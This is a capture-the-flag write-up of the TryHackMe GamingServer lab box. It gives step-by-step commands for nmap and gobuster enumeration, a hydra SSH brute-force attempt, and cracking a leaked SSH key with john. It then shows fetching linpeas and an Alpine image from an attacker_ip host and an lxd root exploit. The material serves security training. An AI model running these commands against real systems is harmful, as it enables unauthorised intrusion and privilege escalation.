---
permalink: /GamingWriteup.html
---

<img src=https://i.imgur.com/lZRim5g.jpg alt="gaming">

## Tryhackme Gaming Server Writeup.

This writeup is on the [Tryhackme GamingServer](https://tryhackme.com/room/gamingserver) machine.
It is an easy level machine, and is described as: > An Easy Boot2Root box for beginners

This is how I got both flags.

## Enumerating.

First, I started off with a simple nmap scan.

```
nmap -sC -sV -v -oA gamingserver *machine_ip*
```

This showed me that there were two ports open on the machine, port 22 for *SSH* and port 80 for *HTTP*

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Since there was a webpage, I directed my attention there first. 
Simply checking the source of the websites index page showed a comment at the bottom referring to a user named *john*
I ran hydra in the background to attempt to bruteforce his password, but nothing came up.

```
hydra -l john -P *path to wordlist* *machine_ip* ssh
```

Running gobuster using the common.txt wordlist from dirb revealed a /secret directory and an /uploads directory.
The /secret directory seemed out of place, so I checked there first.

<img src=https://i.imgur.com/FYrdjNd.png>

In the /secret index there was a single file named *"SecretKey"* and opening it revealed a private ssh key.
I copied it to my folder and gave it the right permissions.

```
chmod 600 SecretKey
```

Under the folder /uploads there were a few files and a wordlist which I assumed would be for bruteforcing something. So I saved it to my machine.

<img src=https://i.imgur.com/BoiE8ui.png/>

Simply ssh'ing into the machine under *John* prompted us with a password for the ssh key. No problem.
John the ripper should be good enough for this job!.
First i used ssh2john to format the key into something john the ripper can read.

```
/usr/share/john/ssh2john.py SecretKey > keyhash
```
Next, I ran the wordlist I found earlier in the uploads directory on the hash.

```
john keyhash -w=dict.lst
```

Boom! Found it!

<img src=https://i.imgur.com/gvMwN2e.png/>

## Getting User.txt

Now I have a way to access the machine, we can use ssh to log in as the *John* user.

```
ssh -i SecretKey john@machine_ip
```

When prompted for a passphrase, we enter the one found by john the ripper earlier.

Now all we have to do is *ls* and we have the user.txt

<img src=https://i.imgur.com/QWbXKr5.png/>

## Privesc to Root.txt

This one stumped me for a second, I haven't heard of this privesc until now,
so finding it was more tedious than it should've.

Let's run linpeas on the machine to find any privesc vectors.
First, we create a python server in the folder where we have our [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) script stored.

```
*ATTACKER MACHINE* sudo python3 -m http.server
```

Then we download the script on the victim machine

```
*VICTIM MACHINE* wget attacker_ip:8000/linpeas.sh
```
From there it's as simple as running chmod and executing the script.

```
chmod +x linpeas.sh
./linpeas.sh
```

Once linpeas is finished, we need to find anything red, or highlighted. Highlighted items are 99% of the time privesc vectors, and red items are ones that should
be checked out if none of the highlighted items work.
Here, we can see that root and lxd are highlighted.

<img src=https://i.imgur.com/ZcRVxi2.png/>

Initially I thought it would be as simple as running *sudo su* and gaining root privs, but that just led me down a rabbit hole of scouring the machine for johns
real credentials.
After a while, I realised that the lxc item was the privesc vector I was supposed to be focusing on, so after a bit of googling I found [This Privesc](https://www.exploit-db.com/exploits/46978) on exploit-db
To use this privesc, we must first download a build script on our attacker machine and make a tar.gz file to be uploaded to the victim machine.
This is done with:

```wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine```

After that, we compile/build it with:

```sudo bash build-alpine```

After running this commmand, we should have an alpine.tar.gz in our attacker directory. This will be uploaded to the victim machine.
As before with linpeas, we must start a python server on our attacker machine.

```*ATTACKER MACHINE* sudo python3 -m http.server```

And upload it to the victim.

```*VICTIM MACHINE* wget attacker_ip:8000/alpine-v3.12-x86_64-20200831_1414.tar.gz```

The exploit then requires that we run a script to complete the privesc, it's on the exploit-db page linked above.
What I did was create an sh script with:

```nano exploit.sh``` 

And copy paste the script from the exploit-db page to the script on the victims machine, and then chmod +x the script to make it executable.

```chmod +x exploit.sh```

Once we run the script, we should achieve the privesc and become root.

```./exploit.sh -f alpine-v3.12-x86_64-20200831_1414.tar.gz```

Boom! We have achieved root privileges!!

<img src=https://i.imgur.com/blIf2iY.png/>

Once we cd to /mnt/root/root we can *ls* and find our sweet, sweet, root.txt

<img src=https://i.imgur.com/uEVyjAm.png/>

## Thank you for reading!

This was a fun machine, thank you to the creator and thank you to YOU! for reading my writeup.
Until next time. :)
Stay sane.



